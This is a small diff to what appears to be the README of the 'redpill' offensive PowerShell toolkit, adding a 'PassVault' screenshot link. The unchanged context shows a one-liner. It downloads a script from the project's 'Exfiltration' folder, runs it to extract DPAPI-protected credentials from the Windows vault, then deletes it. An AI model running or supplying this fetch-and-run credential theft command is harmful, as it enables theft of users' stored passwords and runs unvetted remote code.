@@ -204,6 +204,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfilt
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"|Unblock-File;powershell -File "Invoke-VaultCmd.ps1" -action "dpapi" -banner "true" -secure;Remove-Item -Path "Invoke-VaultCmd.ps1" -Force
 ```
+![PassVault](https://github.com/r00t-3xp10it/redpill/assets/23490060/ff4fce40-8a69-4eea-bf61-05ee31754f4c)
 
 <br />
 
